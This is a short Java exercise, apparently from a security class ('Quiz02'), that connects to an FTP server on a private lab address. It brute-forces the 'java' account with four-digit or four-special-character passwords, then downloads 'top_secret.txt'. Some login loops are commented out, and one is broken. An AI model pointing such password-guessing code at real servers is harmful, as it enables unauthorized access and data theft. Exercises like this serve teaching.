import java.io.File;

import it.sauronsoftware.ftp4j.FTPClient;

public class Quiz02 {

	public static void main(String[] args) {
		// Brute Force: 무작위 대입 공격
		
		FTPClient client = new FTPClient();
		
		client.setCharset("euckr");
		try {
			client.connect("192.168.0.161");
		
			// 숫자 4자리로 이루어진 비밀번호
//			for(int i=1000; i<10000; i++) {
//				try {
//					// int type ==> string type change
//					// String str = String.valueOf(i);
//					client.login("java", String.valueOf(i));
//					break;
//				} catch (Exception e) {
//					System.out.println("로그인 실패 : " + i);
//				}
//					
//			}
			
			// 특수문자 !@#$%^&*() 중 4글자
			
			String special = "!@#$%^&*()";
			char[] keys = "!@#$%^&*()".toCharArray();
			
			for(int i=0; i<keys.length; i++) {
				for(int j=0; j<keys.length; j++) {
					for(int k=0; k<keys.length; k++) {
						for(int l=0; l<keys.length; l++) {
							System.out.println(keys[i] + "" + keys[j] + "" + keys[k] + "" + keys[l]);
						}
					}
				}
			}
			
//			for(int i=0; i<keys.length; i++) {
//				try {
//					// int type ==> string type change
//					// String str = String.valueOf(i);
//					client.login("java", String.valueOf(i));
//					break;
//				} catch (Exception e) {
//					System.out.println("로그인 실패 : " + i);
//				}
//					
//			}
			
			client.download("top_secret.txt", new File("c:/workspace/downloads/성공txt"));
			client.disconnect(true);
		} catch (Exception e) {
			// TODO: handle exception
		}
		
	}

}
